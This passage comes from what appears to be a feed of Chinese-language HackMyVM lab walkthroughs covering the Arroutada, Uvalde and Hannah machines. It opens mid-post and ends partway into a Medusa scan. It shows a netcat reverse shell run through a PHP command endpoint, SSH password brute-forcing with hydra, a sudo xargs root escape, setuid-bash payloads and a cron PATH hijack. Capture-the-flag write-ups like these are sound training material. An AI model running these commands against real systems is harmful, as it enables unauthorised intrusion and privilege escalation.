www-data@arroutada:/tmp$ wget --post-data='{'command':'whoami'}' http://127.0.0.1:8000/priv.php -q -O -
drito


/*

$json = file_get_contents('php://input');
$data = json_decode($json, true);

if (isset($data['command'])) {
    system($data['command']);
} else {
    echo 'Error: the 'command' parameter is not specified in the request body.';
}

*/
```

利用

```
www-data@arroutada:/tmp$ wget --post-data='{'command':'nc 192.168.205.128 8888 -e /bin/bash'}' http://127.0.0.1:8000/priv.php -q -O -
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888           
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.151] 60268
id
uid=1001(drito) gid=1001(drito) groups=1001(drito)
```

获取反向 shell 后，通过以下命令获得稳定的交互式 TTY shell：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

提权

```
drito@arroutada:~/web$ sudo -l
Matching Defaults entries for drito on arroutada:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User drito may run the following commands on arroutada:
    (ALL : ALL) NOPASSWD: /usr/bin/xargs
```

https://gtfobins.github.io/gtfobins/xargs/#sudo

```bash
drito@arroutada:~/web$ sudo xargs -a /dev/null bash
root@arroutada:/home/drito/web# id
uid=0(root) gid=0(root) groups=0(root)
```

&lt;!-- ##{'timestamp':1739012133}## --&gt;sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Arroutada.html</guid><pubDate>Sat, 08 Feb 2025 10:55:33 +0000</pubDate></item><item><title>hmv_uvalde</title><link>https://7r1UMPHK.github.io/post/hmv_uvalde.html</link><description># 0.简介

靶机：https://hackmyvm.eu/machines/machine.php?vm=Uvalde
 难度：绿色
 目标 IP：192.168.205.149
 本机 IP：192.168.205.128

# 1.扫描

nmap起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -A -Pn -n --min-rate 10000 192.168.205.149
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-08 09:15 CST
Nmap scan report for 192.168.205.149
Host is up (0.00022s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.205.128
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1000     1000         5154 Jan 28  2023 output
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 3a:09:a4:da:d7:db:99:ee:a5:51:05:e9:af:e7:08:90 (RSA)
|   256 cb:42:6a:be:22:13:2c:f2:57:f9:80:d1:f7:fb:88:5c (ECDSA)
|_  256 44:3c:b4:0f:aa:c3:94:fa:23:15:19:e3:e5:18:56:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Agency - Start Bootstrap Theme
MAC Address: 08:00:27:79:3A:5B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.22 ms 192.168.205.149

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.35 seconds
```

# 2.踩点

```
┌──(kali㉿kali)-[~/test]
└─$ ftp 192.168.205.149                          
Connected to 192.168.205.149.
220 (vsFTPd 3.0.3)
Name (192.168.205.149:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -al
229 Entering Extended Passive Mode (|||61334|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        116          4096 Jan 28  2023 .
drwxr-xr-x    2 0        116          4096 Jan 28  2023 ..
-rw-r--r--    1 1000     1000         5154 Jan 28  2023 output
226 Directory send OK.
ftp&gt; mget output
mget output [anpqy?]? y
229 Entering Extended Passive Mode (|||41326|)
150 Opening BINARY mode data connection for output (5154 bytes).
100% |*****************************************************************************************|  5154        9.15 MiB/s    00:00 ETA
226 Transfer complete.
5154 bytes received in 00:00 (4.77 MiB/s)
ftp&gt; exit
221 Goodbye.
                              
┌──(kali㉿kali)-[~/test]
└─$ file output 
output: Unicode text, UTF-8 text, with very long lines (328), with CRLF, CR, LF line terminators, with escape sequences, with overstriking
           
┌──(kali㉿kali)-[~/test]
└─$ cat output  
Script démarré sur 2023-01-28 19:54:05+01:00 [TERM='xterm-256color' TTY='/dev/pts/0' COLUMNS='105' LINES='25']
matthew@debian:~$ id
uid=1000(matthew) gid=1000(matthew) groupes=1000(matthew)
matthew@debian:~$ ls -al
total 32
drwxr-xr-x 4 matthew matthew 4096 28 janv. 19:54 .
drwxr-xr-x 3 root    root    4096 23 janv. 07:52 ..
lrwxrwxrwx 1 root    root       9 23 janv. 07:53 .bash_history -&gt; /dev/null
-rw-r--r-- 1 matthew matthew  220 23 janv. 07:51 .bash_logout
-rw-r--r-- 1 matthew matthew 3526 23 janv. 07:51 .bashrc
drwx------ 3 matthew matthew 4096 23 janv. 08:04 .config
drwxr-xr-x 3 matthew matthew 4096 23 janv. 08:04 .local
-rw-r--r-- 1 matthew matthew  807 23 janv. 07:51 .profile
-rw-r--r-- 1 matthew matthew    0 28 janv. 19:54 typescript
-rwx------ 1 matthew matthew   33 23 janv. 07:53 user.txt
matthew@debian:~$ toilet -f mono12 -F metal hackmyvm.eu
                                                                              
 ▄▄                            ▄▄                                             
 ██                            ██                                             
 ██▄████▄   ▄█████▄   ▄█████▄  ██ ▄██▀   ████▄██▄  ▀██  ███  ██▄  ▄██  ████▄██▄ 
 ██▀   ██   ▀ ▄▄▄██  ██▀    ▀  ██▄██     ██ ██ ██   ██▄ ██    ██  ██   ██ ██ ██ 
 ██    ██  ▄██▀▀▀██  ██        ██▀██▄    ██ ██ ██    ████▀    ▀█▄▄█▀   ██ ██ ██ 
 ██    ██  ██▄▄▄███  ▀██▄▄▄▄█  ██  ▀█▄   ██ ██ ██     ███      ████    ██ ██ ██ 
 ▀▀    ▀▀   ▀▀▀▀ ▀▀    ▀▀▀▀▀   ▀▀   ▀▀▀  ▀▀ ▀▀ ▀▀     ██        ▀▀     ▀▀ ▀▀ ▀▀ 
                                                    ███                       
                                                                              
                                                                              
                                                                              
                                                                              
            ▄████▄   ██    ██                                                 
           ██▄▄▄▄██  ██    ██                                                 
           ██▀▀▀▀▀▀  ██    ██                                                 
    ██     ▀██▄▄▄▄█  ██▄▄▄███                                                 
    ▀▀       ▀▀▀▀▀    ▀▀▀▀ ▀▀                                                 
                                                                              
                                                                              
matthew@debian:~$ exit
exit

Script terminé sur 2023-01-28 19:54:37+01:00 [COMMAND_EXIT_CODE='0']
                                                                         
```

暂时没啥作用，继续踩点。页面是静态的，看一下有没有什么明显漏洞

```
┌──(kali㉿kali)-[~/test]
└─$ nuclei -u http://192.168.205.149             

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.3.8

                projectdiscovery.io

[WRN] Found 2 templates with runtime error (use -validate flag for further examination)
[INF] Current nuclei version: v3.3.8 (latest)
[INF] Current nuclei-templates version: v10.1.2 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 52
[INF] Templates loaded for current scan: 7654
[INF] Executing 7274 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 380 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1693 (Reduced 1591 Requests)
[INF] Using Interactsh Server: oast.live
[missing-sri] [http] [info] http://192.168.205.149 ['https://fonts.googleapis.com/css?family=Montserrat:400,700','https://fonts.googleapis.com/css?family=Kaushan+Script','https://fonts.googleapis.com/css?family=Droid+Serif:400,700,400italic,700italic','https://fonts.googleapis.com/css?family=Roboto+Slab:400,100,300,700']                                                                              
[waf-detect:apachegeneric] [http] [info] http://192.168.205.149
[openssh-detect] [tcp] [info] 192.168.205.149:22 ['SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1']
[ssh-server-enumeration] [javascript] [info] 192.168.205.149:22 ['SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1']
[ssh-auth-methods] [javascript] [info] 192.168.205.149:22 ['['publickey','password']']
[ssh-password-auth] [javascript] [info] 192.168.205.149:22
[ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.149:22
[CVE-2023-48795] [javascript] [medium] 192.168.205.149:22 ['Vulnerable to Terrapin']
[ftp-anonymous-login] [tcp] [medium] 192.168.205.149:21
[tech-detect:font-awesome] [http] [info] http://192.168.205.149
[tech-detect:bootstrap] [http] [info] http://192.168.205.149
[tech-detect:google-font-api] [http] [info] http://192.168.205.149
[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.149
[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.205.149
[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.205.149
[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.149
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.149
[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.205.149
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.205.149
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.205.149
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.205.149
[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.205.149
[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.205.149
[form-detection] [http] [info] http://192.168.205.149
[apache-detect] [http] [info] http://192.168.205.149 ['Apache/2.4.54 (Debian)']
[package-json] [http] [info] http://192.168.205.149/package.json
[package-json] [http] [info] http://192.168.205.149/package-lock.json
                                             
```

没看到啥，那我们去爆破目录

```
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u http://192.168.205.149 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v '403'
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.149
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login.php            (Status: 200) [Size: 1022]
/js                   (Status: 301) [Size: 315] [--&gt; http://192.168.205.149/js/]
/index.php            (Status: 200) [Size: 29604]
/css                  (Status: 301) [Size: 316] [--&gt; http://192.168.205.149/css/]
/user.php             (Status: 302) [Size: 0] [--&gt; login.php]
/img                  (Status: 301) [Size: 316] [--&gt; http://192.168.205.149/img/]
/create_account.php   (Status: 200) [Size: 1003]
/mail                 (Status: 301) [Size: 317] [--&gt; http://192.168.205.149/mail/]
/.                    (Status: 200) [Size: 29604]
/success.php          (Status: 302) [Size: 0] [--&gt; login.php]
/vendor               (Status: 301) [Size: 319] [--&gt; http://192.168.205.149/vendor/]
Progress: 598000 / 598005 (100.00%)
===============================================================
Finished
===============================================================
                                                                 
```

有一个注册/create_account.php，我们尝试注册

![image-20250331190202777](https://7r1umphk.github.io/image/20250331190202831.png)

后面那一串有点像64,我们拿起解密看看

![](https://7r1umphk.github.io/image/20250331190202831.png)

可以看到它的密码格式是以用户名+注册年+@+随机4位数，那我们生成字典爆破一下

```
┌──(kali㉿kali)-[~/test]
└─$ for i in $(seq -w 0 9999); do echo 'matthew2023@$i' ;done &gt; pass
```

打开我们的burp

![image-20250331190214441](https://7r1umphk.github.io/image/20250331190214521.png)

![image-20250331190219774](https://7r1umphk.github.io/image/20250331190219855.png)

421长度明显不一样，我们使用这个密码测试登录

![image-20250331190225481](https://7r1umphk.github.io/image/20250331190225550.png)

我们先尝试可不可以ssh登录

```
┌──(kali㉿kali)-[~/test]
└─$ ssh matthew@192.168.205.149
The authenticity of host '192.168.205.149 (192.168.205.149)' can't be established.
ED25519 key fingerprint is SHA256:S2tp/jV32/GtUP68f14Rac4/yZXhbMmyut+ZqO+ZOl4.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:6: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.149' (ED25519) to the list of known hosts.
matthew@192.168.205.149's password: 
Linux uvalde.hmv 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
matthew@uvalde:~$ id
uid=1000(matthew) gid=1000(matthew) groups=1000(matthew)
```

# 3.提权

```
matthew@uvalde:~$ sudo -l
Matching Defaults entries for matthew on uvalde:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User matthew may run the following commands on uvalde:
    (ALL : ALL) NOPASSWD: /bin/bash /opt/superhack
matthew@uvalde:~$ ls -la /opt/
total 12
drwx---rwx  2 root root 4096 Feb  5  2023 .
drwxr-xr-x 18 root root 4096 Jan 22  2023 ..
-rw-r--r--  1 root root 1594 Jan 31  2023 superhack
matthew@uvalde:~$ cat /opt/superhack 
#! /bin/bash 
clear -x

GRAS=$(tput bold)
JAUNE=$(tput setaf 3)$GRAS
BLANC=$(tput setaf 7)$GRAS
BLEU=$(tput setaf 4)$GRAS
VERT=$(tput setaf 2)$GRAS
ROUGE=$(tput setaf 1)$GRAS
RESET=$(tput sgr0)

cat &lt;&lt; EOL


 _______  __   __  _______  _______  ______    __   __  _______  _______  ___   _ 
|       ||  | |  ||       ||       ||    _ |  |  | |  ||   _   ||       ||   | | |
|  _____||  | |  ||    _  ||    ___||   | ||  |  |_|  ||  |_|  ||       ||   |_| |
| |_____ |  |_|  ||   |_| ||   |___ |   |_||_ |       ||       ||       ||      _|
|_____  ||       ||    ___||    ___||    __  ||       ||       ||      _||     |_ 
 _____| ||       ||   |    |   |___ |   |  | ||   _   ||   _   ||     |_ |    _  |
|_______||_______||___|    |_______||___|  |_||__| |__||__| |__||_______||___| |_|



EOL


printf '${BLANC}Tool:${RESET} ${BLEU}superHack${RESET}\n'
printf '${BLANC}Author:${RESET} ${BLEU}hackerman${RESET}\n'
printf '${BLANC}Version:${RESET} ${BLEU}1.0${RESET}\n'

printf '\n'

[[ $# -ne 0 ]] &amp;&amp; echo -e '${BLEU}Usage:${RESET} $0 domain' &amp;&amp; exit

while [ -z '$domain' ]; do
read -p '${VERT}domain to hack:${RESET} ' domain
done

printf '\n'

n=50

string=''
for ((i=0; i&lt;$n; i++))
do
string+='.'
done

for ((i=0; i&lt;$n; i++))
do
string='${string/./#}'
printf '${BLANC}Hacking progress...:${RESET} ${BLANC}[$string]${RESET}\r'
sleep .09
done

printf '\n'
printf '${JAUNE}Target $domain ====&gt; PWNED${RESET}\n'
printf '${JAUNE}URL: https://$domain/*********************.php${RESET}\n'

echo -e '\n${ROUGE}Pay 0.000047 BTC to 3FZbgi29cpjq2GjdwV8eyHuJJnkLtktZc5 to unlock backdoor.${RESET}\n'
```

我们可以修改当前目录，使用把脚本换一下就好了

```
matthew@uvalde:/opt$ mv superhack superhack1
matthew@uvalde:/opt$ ls -la
total 12
drwx---rwx  2 root root 4096 Feb  8 02:37 .
drwxr-xr-x 18 root root 4096 Jan 22  2023 ..
-rw-r--r--  1 root root 1594 Jan 31  2023 superhack1
matthew@uvalde:/opt$ echo 'cp /bin/bash /tmp/sh;chmod u+s /tmp/sh' &gt; superhack
matthew@uvalde:/opt$ ls -al
total 16
drwx---rwx  2 root    root    4096 Feb  8 02:38 .
drwxr-xr-x 18 root    root    4096 Jan 22  2023 ..
-rw-r--r--  1 matthew matthew   39 Feb  8 02:38 superhack
-rw-r--r--  1 root    root    1594 Jan 31  2023 superhack1
matthew@uvalde:/opt$ ls -la /tmp/
total 40
drwxrwxrwt 10 root root 4096 Feb  8 02:29 .
drwxr-xr-x 18 root root 4096 Jan 22  2023 ..
drwxrwxrwt  2 root root 4096 Feb  8 02:14 .font-unix
drwxrwxrwt  2 root root 4096 Feb  8 02:14 .ICE-unix
drwx------  3 root root 4096 Feb  8 02:14 systemd-private-da80bce88f6c483fb3f7d4a8a59370c0-apache2.service-l1oDZf
drwx------  3 root root 4096 Feb  8 02:14 systemd-private-da80bce88f6c483fb3f7d4a8a59370c0-systemd-logind.service-fSJRkg
drwx------  3 root root 4096 Feb  8 02:14 systemd-private-da80bce88f6c483fb3f7d4a8a59370c0-systemd-timesyncd.service-UNC5xf
drwxrwxrwt  2 root root 4096 Feb  8 02:14 .Test-unix
drwxrwxrwt  2 root root 4096 Feb  8 02:14 .X11-unix
drwxrwxrwt  2 root root 4096 Feb  8 02:14 .XIM-unix
matthew@uvalde:/opt$ sudo /bin/bash /opt/superhack
matthew@uvalde:/opt$ ls -la /tmp/
total 1248
drwxrwxrwt 10 root root    4096 Feb  8 02:39 .
drwxr-xr-x 18 root root    4096 Jan 22  2023 ..
drwxrwxrwt  2 root root    4096 Feb  8 02:14 .font-unix
drwxrwxrwt  2 root root    4096 Feb  8 02:14 .ICE-unix
-rwsr-xr-x  1 root root 1234376 Feb  8 02:39 sh
drwx------  3 root root    4096 Feb  8 02:14 systemd-private-da80bce88f6c483fb3f7d4a8a59370c0-apache2.service-l1oDZf
drwx------  3 root root    4096 Feb  8 02:14 systemd-private-da80bce88f6c483fb3f7d4a8a59370c0-systemd-logind.service-fSJRkg
drwx------  3 root root    4096 Feb  8 02:14 systemd-private-da80bce88f6c483fb3f7d4a8a59370c0-systemd-timesyncd.service-UNC5xf
drwxrwxrwt  2 root root    4096 Feb  8 02:14 .Test-unix
drwxrwxrwt  2 root root    4096 Feb  8 02:14 .X11-unix
drwxrwxrwt  2 root root    4096 Feb  8 02:14 .XIM-unix
matthew@uvalde:/opt$ /tmp/sh -p
sh-5.1# id
uid=1000(matthew) gid=1000(matthew) euid=0(root) groups=1000(matthew)
```

&lt;!-- ##{'timestamp':1739012133}## --&gt;sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_uvalde.html</guid><pubDate>Sat, 08 Feb 2025 10:55:33 +0000</pubDate></item><item><title>hmv_hannah</title><link>https://7r1UMPHK.github.io/post/hmv_hannah.html</link><description># hmv_hannah

# 0.简介

**靶机**：https://hackmyvm.eu/machines/machine.php?vm=Hannah  
**难度**：绿色  
**目标 IP**：192.168.205.150  
**本机 IP**：192.168.205.128

# 1.扫描

​`nmap`​起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -A -Pn -n --min-rate 10000 192.168.205.150
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-08 16:07 CST
Nmap scan report for 192.168.205.150
Host is up (0.00031s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 5f:1c:78:36:99:05:32:09:82:d3:d5:05:4c:14:75:d1 (RSA)
|   256 06:69:ef:97:9b:34:d7:f3:c7:96:60:d1:a1:ff:d8:2c (ECDSA)
|_  256 85:3d:da:74:b2:68:4e:a6:f7:e5:f5:85:40:90:2e:9a (ED25519)
|_auth-owners: root
80/tcp  open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
| http-robots.txt: 1 disallowed entry 
|_/enlightenment
|_http-title: Site doesn't have a title (text/html).
|_auth-owners: moksha
113/tcp open  ident?
|_auth-owners: root
MAC Address: 08:00:27:7C:E4:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.31 ms 192.168.205.150

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.58 seconds
                                                   
```

113未知端口，优先查看

# 2.踩点

https://book.hacktricks.wiki/zh/network-services-pentesting/113-pentesting-ident.html#basic-information

```
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.150:113                                                                       
curl: (56) Recv failure: 连接被对方重置
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ nc 192.168.205.150 113 
hello 
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ nc -vn 192.168.205.150 113
(UNKNOWN) [192.168.205.150] 113 (auth) open
hello
                            

┌──(kali㉿kali)-[~/test]
└─$ ident-user-enum 192.168.205.150 80 22 113
ident-user-enum v1.0 ( http://pentestmonkey.net/tools/ident-user-enum )

192.168.205.150:80      moksha
192.168.205.150:22      root
192.168.205.150:113     root
                               
```

有一个moksha用户，我们尝试爆破ssh

```
┌──(kali㉿kali)-[~/test]
└─$ hydra -l moksha -P /usr/share/wordlists/q5000.txt ssh://192.168.205.150 -V -I -u -f -e nsr -t 64

Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-08 16:23:42
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 5003 login tries (l:1/p:5003), ~79 tries per task
[DATA] attacking ssh://192.168.205.150:22/
[22][ssh] host: 192.168.205.150   login: moksha   password: hannah
[STATUS] attack finished for 192.168.205.150 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-08 16:23:44

```

我第一次爆破的时候没出来，真的有点无语

```
┌──(kali㉿kali)-[~/test]
└─$ ssh moksha@192.168.205.150    
moksha@192.168.205.150's password: 
Linux hannah 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jan  4 10:45:54 2023 from 192.168.1.51
moksha@hannah:~$ id
uid=1000(moksha) gid=1000(moksha) grupos=1000(moksha),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)

```

# 3.提权

```
moksha@hannah:~$ sudo -l
-bash: sudo: orden no encontrada
moksha@hannah:~$ which sudo
moksha@hannah:~$ find / -name sudo 2&gt;/dev/null
/usr/share/bash-completion/completions/sudo
moksha@hannah:~$ /usr/share/bash-completion/completions/sudo -l
-bash: /usr/share/bash-completion/completions/sudo: Permiso denegado
moksha@hannah:~$ ls -la /usr/share/bash-completion/completions/sudo
-rw-r--r-- 1 root root 1504 ago 12  2020 /usr/share/bash-completion/completions/sudo

```

我还以为又藏sudo呢

```
moksha@hannah:~$ ls -la
total 32
drwxr-xr-x 3 moksha moksha 4096 ene  4  2023 .
drwxr-xr-x 3 root   root   4096 ene  4  2023 ..
lrwxrwxrwx 1 moksha moksha    9 ene  4  2023 .bash_history -&gt; /dev/null
-rw-r--r-- 1 moksha moksha  220 ene  4  2023 .bash_logout
-rw-r--r-- 1 moksha moksha 3526 ene  4  2023 .bashrc
drwxr-xr-x 3 moksha moksha 4096 ene  4  2023 .local
-rw-r--r-- 1 moksha moksha  807 ene  4  2023 .profile
-rw------- 1 moksha moksha   14 ene  4  2023 user.txt
-rw------- 1 moksha moksha   52 ene  4  2023 .Xauthority
moksha@hannah:~$ cd ..
moksha@hannah:/home$ ls -al
total 12
drwxr-xr-x  3 root   root   4096 ene  4  2023 .
drwxr-xr-x 18 root   root   4096 ene  4  2023 ..
drwxr-xr-x  3 moksha moksha 4096 ene  4  2023 moksha
moksha@hannah:/home$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/mount
moksha@hannah:/home$ /sbin/getcap -r / 2&gt;/dev/null
/usr/bin/ping cap_net_raw=ep
moksha@hannah:/home$ cat /etc/cron*
cat: /etc/cron.d: Es un directorio
cat: /etc/cron.daily: Es un directorio
cat: /etc/cron.hourly: Es un directorio
cat: /etc/cron.monthly: Es un directorio
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/media:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
* * * * * root touch /tmp/enlIghtenment
17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
#
cat: /etc/cron.weekly: Es un directorio

moksha@hannah:/tmp$ which touch
/usr/bin/touch

moksha@hannah:/tmp$ ls -la /media
total 12
drwxrwxrwx  3 root root 4096 ene  4  2023 .
drwxr-xr-x 18 root root 4096 ene  4  2023 ..
lrwxrwxrwx  1 root root    6 ene  4  2023 cdrom -&gt; cdrom0
drwxr-xr-x  2 root root 4096 ene  4  2023 cdrom0

```

有一个定时任务，我们可以看到它的环境变量也有问题，所以

```
moksha@hannah:/tmp$ echo 'cp /bin/bash /tmp/sh;chmod u+s /tmp/sh' &gt; /media/touch
moksha@hannah:/tmp$ ls /tmp/
enlIghtenment
systemd-private-7e7d884382b944e89570ebdfb081124b-systemd-logind.service-Bwv8Xg
systemd-private-7e7d884382b944e89570ebdfb081124b-systemd-timesyncd.service-S60g6e
moksha@hannah:/tmp$ chmod +x /media/touch

```

等子弹飞一会

```
moksha@hannah:/tmp$ ls
enlIghtenment  systemd-private-7e7d884382b944e89570ebdfb081124b-systemd-logind.service-Bwv8Xg
sh             systemd-private-7e7d884382b944e89570ebdfb081124b-systemd-timesyncd.service-S60g6e
moksha@hannah:/tmp$ ./sh -p
sh-5.1# id
uid=1000(moksha) gid=1000(moksha) euid=0(root) grupos=1000(moksha),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)

```

‍&lt;!-- ##{'timestamp':1739012133}## --&gt;sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_hannah.html</guid><pubDate>Sat, 08 Feb 2025 10:55:33 +0000</pubDate></item><item><title>hmv_Medusa</title><link>https://7r1UMPHK.github.io/post/hmv_Medusa.html</link><description># 0.简介

靶机：https://hackmyvm.eu/machines/?v=Medusa
 难度：绿色
 目标 IP：192.168.205.145
 本机 IP：192.168.205.128

# 1.扫描

nmap起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -A -Pn -n --min-rate 10000 192.168.205.145
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-04 17:42 CST
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Nmap scan report for 192.168.205.145
Host is up (0.00026s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 70:d4:ef:c9:27:6f:8d:95:7a:a5:51:19:51:fe:14:dc (RSA)
